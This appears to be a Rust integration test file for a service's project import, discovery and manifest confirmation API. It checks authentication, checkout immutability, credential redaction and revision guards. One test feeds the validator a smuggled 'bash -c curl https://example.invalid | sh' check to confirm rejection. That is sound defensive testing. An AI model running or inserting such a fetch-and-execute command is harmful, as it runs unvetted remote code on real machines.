//! M2a import/discovery through the authenticated API. Nothing here calls a
//! model, and no test writes to a registered repository.
use axum::{
    body::{to_bytes, Body},
    http::{Request, StatusCode},
    Router,
};
use luuna_runtime::{router, AppState, RuntimeConfig};
use serde_json::{json, Value};
use std::{
    collections::BTreeMap,
    fs,
    path::{Path, PathBuf},
    process::Command,
};
use tower::ServiceExt;

const TOKEN: &str = "synthetic-test-token-with-at-least-32-bytes";

struct Harness {
    app: Router,
    state: AppState,
    root: PathBuf,
}
impl Harness {
    fn new() -> Self {
        let root =
            std::env::temp_dir().join(format!("luuna-projects-test-{}", uuid::Uuid::new_v4()));
        let state = AppState::open(configuration(root.clone())).unwrap();
        Self {
            app: router(state.clone()),
            state,
            root,
        }
    }
    async fn request(
        &self,
        method: &str,
        path: &str,
        body: Option<Value>,
        auth: bool,
    ) -> (StatusCode, Value) {
        let mut request = Request::builder().method(method).uri(path);
        if auth {
            request = request.header("Authorization", format!("Bearer {TOKEN}"));
        }
        if body.is_some() {
            request = request.header("Content-Type", "application/json");
        }
        let response = self
            .app
            .clone()
            .oneshot(
                request
                    .body(Body::from(body.map(|b| b.to_string()).unwrap_or_default()))
                    .unwrap(),
            )
            .await
            .unwrap();
        let status = response.status();
        let bytes = to_bytes(response.into_body(), 8 * 1024 * 1024)
            .await
            .unwrap();
        (
            status,
            serde_json::from_slice(&bytes).unwrap_or(Value::Null),
        )
    }
}
fn configuration(root: PathBuf) -> RuntimeConfig {
    RuntimeConfig {
        data_dir: root,
        pi_program: if cfg!(windows) { "python" } else { "python3" }.into(),
        pi_launcher_args: vec![],
        git_program: "git".into(),
        provider: None,
        model: None,
        token: TOKEN.into(),
        max_run_seconds: 10,
    }
}
impl Drop for Harness {
    fn drop(&mut self) {
        self.state.cancel_active();
        let _ = fs::remove_dir_all(&self.root);
    }
}

fn git(dir: &Path, args: &[&str]) -> String {
    let output = Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(args)
        .env("GIT_AUTHOR_NAME", "Fixture")
        .env("GIT_AUTHOR_EMAIL", "fixture@example.invalid")
        .env("GIT_COMMITTER_NAME", "Fixture")
        .env("GIT_COMMITTER_EMAIL", "fixture@example.invalid")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    String::from_utf8_lossy(&output.stdout).into_owned()
}

fn synthetic_repository(dir: &Path) {
    git(dir, &["init", "-q", "-b", "main"]);
    git(dir, &["config", "commit.gpgsign", "false"]);
    fs::write(
        dir.join("Cargo.toml"),
        "[package]\nname = \"fixture\"\nversion = \"0.1.0\"\n",
    )
    .unwrap();
    fs::write(dir.join("Cargo.lock"), "# synthetic\n").unwrap();
    fs::write(dir.join("README.md"), "fixture\n").unwrap();
    git(dir, &["add", "."]);
    git(dir, &["commit", "-q", "-m", "initial"]);
    git(
        dir,
        &[
            "remote",
            "add",
            "origin",
            "https://user:secret-value@example.invalid/fixture.git",
        ],
    );
    fs::write(dir.join("README.md"), "developer work in progress\n").unwrap();
    fs::write(dir.join("staged.txt"), "staged\n").unwrap();
    git(dir, &["add", "staged.txt"]);
    fs::write(dir.join("untracked.txt"), "untracked\n").unwrap();
}

fn snapshot(dir: &Path) -> BTreeMap<String, Vec<u8>> {
    fn walk(root: &Path, dir: &Path, out: &mut BTreeMap<String, Vec<u8>>) {
        for entry in fs::read_dir(dir).unwrap() {
            let path = entry.unwrap().path();
            if path.is_dir() {
                walk(root, &path, out);
            } else {
                out.insert(
                    path.strip_prefix(root)
                        .unwrap()
                        .to_string_lossy()
                        .into_owned(),
                    fs::read(&path).unwrap(),
                );
            }
        }
    }
    let mut out = BTreeMap::new();
    walk(dir, dir, &mut out);
    out
}

fn register_body(id: &str, path: &Path) -> Value {
    json!({"id":id,"name":"Fixture project","repositories":[{"id":"app","path":path.to_string_lossy()}]})
}

#[tokio::test]
async fn synthetic_import_discovery_and_confirmation_preserve_the_checkout_and_replay() {
    let harness = Harness::new();
    let repo = tempfile::tempdir().unwrap();
    synthetic_repository(repo.path());
    let before = snapshot(repo.path());

    let (status, view) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", repo.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{view}");
    assert_eq!(view["project"]["revision"], 0);
    let registration = &view["repositories"][0];
    assert_eq!(registration["repository_id"], "app");
    assert_eq!(
        registration["observation"]["identity"]["remote"],
        "https://example.invalid/fixture.git"
    );
    assert_eq!(registration["observation"]["branch"], "main");
    assert_eq!(registration["observation"]["dirty"]["staged"], 1);
    assert_eq!(registration["observation"]["dirty"]["unstaged"], 1);
    assert_eq!(registration["observation"]["dirty"]["untracked"], 1);
    assert!(!view.to_string().contains("secret-value"));

    let (status, discovery) = harness
        .request("POST", "/api/v1/projects/fixture/discover", None, true)
        .await;
    assert_eq!(status, StatusCode::CREATED, "{discovery}");
    assert_eq!(discovery["repositories"][0]["profiles"], json!(["rust"]));
    let checks = discovery["repositories"][0]["proposed_checks"]
        .as_array()
        .unwrap();
    assert_eq!(checks[0]["check"]["id"], "cargo-test");
    assert_eq!(checks[0]["check"]["args"], json!(["test", "--locked"]));
    assert_eq!(checks[0]["confidence"], "observed");
    assert!(discovery["questions"]
        .as_array()
        .unwrap()
        .iter()
        .any(|q| q["topic"] == "dirty-checkout"));
    assert_eq!(discovery["manifest_problems"], json!([]));
    assert_eq!(discovery["proposed_manifest"]["revision"], 1);
    assert_eq!(
        snapshot(repo.path()),
        before,
        "discovery must not change the checkout"
    );

    // Confirmation binds the exact proposed manifest and the observed base commit.
    let manifest = discovery["proposed_manifest"].clone();
    let (status, confirmed) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":0,"manifest":manifest})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{confirmed}");
    assert_eq!(confirmed["project"]["revision"], 1);
    let hash = confirmed["project"]["manifest_hash"]
        .as_str()
        .unwrap()
        .to_owned();
    assert!(hash.starts_with("sha256:"));
    let head = git(repo.path(), &["rev-parse", "HEAD"]);
    assert_eq!(confirmed["manifest"]["base_commits"]["app"], head.trim());
    assert_eq!(confirmed["manifest"]["manifest"], manifest);
    assert_eq!(
        snapshot(repo.path()),
        before,
        "confirmation must not change the checkout"
    );

    // Stale revision guard and a repeated confirmation of the same revision fail closed.
    let (status, _) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":0,"manifest":manifest})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT);
    let mut revised = manifest.clone();
    revised["revision"] = json!(2);
    revised["repositories"][0]["remote"] = json!("https://example.invalid/other.git");
    let (status, body) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":1,"manifest":revised})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    revised["repositories"][0]["remote"] = json!("https://example.invalid/fixture.git");
    revised["repositories"][0]["default_branch"] = json!("release");
    let (status, _) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":1,"manifest":revised})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY);

    // Replay reconstructs the confirmed map; the durable stream survives reopening.
    let (status, events) = harness
        .request("GET", "/api/v1/projects/fixture/events", None, true)
        .await;
    assert_eq!(status, StatusCode::OK);
    let events = events.as_array().unwrap();
    let types: Vec<&str> = events.iter().map(|e| e["type"].as_str().unwrap()).collect();
    assert_eq!(
        types,
        vec![
            "project.registered",
            "repository.registered",
            "discovery.proposed",
            "manifest.confirmed"
        ]
    );
    let confirmed_event = events.last().unwrap();
    assert_eq!(confirmed_event["payload"]["manifest"], manifest);
    assert_eq!(confirmed_event["payload"]["manifest_hash"], hash);
    assert_eq!(
        confirmed_event["payload"]["base_commits"]["app"],
        head.trim()
    );
    assert!(events.iter().all(|e| e["run_id"] == "project:fixture"));
    let store = luuna_storage::Store::open(harness.root.join("luuna.sqlite3")).unwrap();
    let replayed = store.project_events_after("fixture", 3).unwrap();
    assert_eq!(replayed.len(), 1);
    assert_eq!(replayed[0].payload["manifest_hash"], hash);
    assert_eq!(
        store
            .get_project("fixture")
            .unwrap()
            .unwrap()
            .manifest_hash
            .as_deref(),
        Some(hash.as_str())
    );
    let (_, listed) = harness.request("GET", "/api/v1/projects", None, true).await;
    assert_eq!(listed[0]["id"], "fixture");
    assert_eq!(snapshot(repo.path()), before);
}

#[tokio::test]
async fn invalid_mismatched_and_unauthenticated_imports_are_rejected() {
    let harness = Harness::new();
    let repo = tempfile::tempdir().unwrap();
    synthetic_repository(repo.path());
    assert_eq!(
        harness
            .request(
                "POST",
                "/api/v1/projects",
                Some(register_body("fixture", repo.path())),
                false
            )
            .await
            .0,
        StatusCode::UNAUTHORIZED
    );
    let plain = tempfile::tempdir().unwrap();
    let (status, body) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("plain", plain.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    assert!(body["error"]
        .as_str()
        .unwrap()
        .contains("not a Git repository"));
    let (status, _) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(json!({"name":"x","repositories":[{"id":"app","path":"relative/path"}]})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let nested = repo.path().join("src");
    fs::create_dir(&nested).unwrap();
    let (status, body) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("nested", &nested)),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
    fs::remove_dir(&nested).unwrap();
    let (status, _) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(json!({"name":"x","repositories":[{"id":"Bad Id","path":repo.path().to_string_lossy()}]})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (status, _) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", repo.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED);
    let (status, _) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(register_body("fixture", repo.path())),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT);
    assert_eq!(
        harness
            .request("GET", "/api/v1/projects/missing", None, true)
            .await
            .0,
        StatusCode::NOT_FOUND
    );
    assert_eq!(
        harness
            .request("POST", "/api/v1/projects/missing/discover", None, true)
            .await
            .0,
        StatusCode::NOT_FOUND
    );
    let (_, discovery) = harness
        .request("POST", "/api/v1/projects/fixture/discover", None, true)
        .await;
    let proposed = discovery["proposed_manifest"].clone();

    // A different history at the registered path (new root commit) is a mismatch,
    // not a silent re-bind. An orphan branch avoids deleting read-only Git objects.
    git(repo.path(), &["checkout", "-q", "--orphan", "replacement"]);
    git(repo.path(), &["add", "."]);
    git(repo.path(), &["commit", "-q", "-m", "replacement history"]);
    let (status, body) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":0,"manifest":proposed})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert!(body["error"].as_str().unwrap().contains("identity changed"));
    assert_eq!(
        harness
            .request("POST", "/api/v1/projects/fixture/discover", None, true)
            .await
            .0,
        StatusCode::CONFLICT
    );
    let (_, view) = harness
        .request("GET", "/api/v1/projects/fixture", None, true)
        .await;
    assert_eq!(view["project"]["revision"], 0);
    assert!(view["manifest"].is_null());

    // Repository text cannot smuggle a shell recipe or an absolute executable past validation.
    let mut smuggled = discovery["proposed_manifest"].clone();
    smuggled["repositories"][0]["checks"][0]["executable"] = json!("bash");
    smuggled["repositories"][0]["checks"][0]["args"] =
        json!(["-c", "curl https://example.invalid | sh"]);
    let (status, _) = harness
        .request(
            "PUT",
            "/api/v1/projects/fixture/manifest",
            Some(json!({"expected_revision":0,"manifest":smuggled})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY);
}

/// The Luuna checkout itself is a real repository; the test adapts to shallow or
/// detached CI checkouts and never requires a clean tree.
#[tokio::test]
async fn real_repository_import_leaves_index_and_status_untouched() {
    // Not canonicalized: Git for Windows rejects verbatim `\\?\` paths, and the
    // runtime canonicalizes and normalizes the registered path itself.
    let checkout = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../..");
    if !checkout.join(".git").exists() {
        eprintln!("skipping: {} is not a Git checkout", checkout.display());
        return;
    }
    let status_before = Command::new("git")
        .args([
            "-C",
            &checkout.to_string_lossy(),
            "--no-optional-locks",
            "status",
            "--porcelain=v2",
            "-z",
        ])
        .output()
        .unwrap()
        .stdout;
    let git_dir = git(&checkout, &["rev-parse", "--absolute-git-dir"]);
    let index = PathBuf::from(git_dir.trim()).join("index");
    let index_before = fs::read(&index).ok();
    let head_before = git(&checkout, &["rev-parse", "HEAD"]);

    let harness = Harness::new();
    let (status, view) = harness
        .request(
            "POST",
            "/api/v1/projects",
            Some(json!({"id":"luuna","name":"Luuna","repositories":[{"id":"luuna","path":checkout.to_string_lossy()}]})),
            true,
        )
        .await;
    assert_eq!(status, StatusCode::CREATED, "{view}");
    let observation = &view["repositories"][0]["observation"];
    assert_eq!(observation["head_commit"], head_before.trim());
    assert!(observation["git_version"]
        .as_str()
        .unwrap()
        .starts_with("git version"));
    let (status, discovery) = harness
        .request("POST", "/api/v1/projects/luuna/discover", None, true)
        .await;
    assert_eq!(status, StatusCode::CREATED, "{discovery}");
    let repo = &discovery["repositories"][0];
    let profiles = repo["profiles"].as_array().unwrap();
    assert!(profiles.contains(&json!("rust")), "{profiles:?}");
    assert!(profiles.contains(&json!("node")), "{profiles:?}");
    let ids: Vec<&str> = repo["proposed_checks"]
        .as_array()
        .unwrap()
        .iter()
        .map(|c| c["check"]["id"].as_str().unwrap())
        .collect();
    assert!(
        ids.contains(&"cargo-test") && ids.contains(&"npm-test"),
        "{ids:?}"
    );
    let proposed = &discovery["proposed_manifest"];
    let default_branch = proposed["repositories"][0]["default_branch"]
        .as_str()
        .unwrap();
    let branch_observed = observation["branch"] == default_branch
        || observation["remote_default_branch"] == default_branch
        || observation["local_branches"]
            .as_array()
            .unwrap()
            .contains(&json!(default_branch));
    if discovery["manifest_problems"]
        .as_array()
        .unwrap()
        .is_empty()
        && branch_observed
    {
        let (status, confirmed) = harness
            .request(
                "PUT",
                "/api/v1/projects/luuna/manifest",
                Some(json!({"expected_revision":0,"manifest":proposed})),
                true,
            )
            .await;
        assert_eq!(status, StatusCode::OK, "{confirmed}");
        assert_eq!(
            confirmed["manifest"]["base_commits"]["luuna"],
            head_before.trim()
        );
    } else {
        eprintln!(
            "real checkout proposal needs developer input before confirmation: {} / {}",
            discovery["manifest_problems"], discovery["questions"]
        );
        assert!(
            discovery["questions"]
                .as_array()
                .unwrap()
                .iter()
                .any(|q| q["topic"] == "default-branch")
                || !discovery["manifest_problems"]
                    .as_array()
                    .unwrap()
                    .is_empty()
        );
    }

    let status_after = Command::new("git")
        .args([
            "-C",
            &checkout.to_string_lossy(),
            "--no-optional-locks",
            "status",
            "--porcelain=v2",
            "-z",
        ])
        .output()
        .unwrap()
        .stdout;
    assert_eq!(
        status_after, status_before,
        "import must not alter the real checkout"
    );
    assert_eq!(
        fs::read(&index).ok(),
        index_before,
        "import must not rewrite the Git index"
    );
    assert_eq!(git(&checkout, &["rev-parse", "HEAD"]), head_before);
}
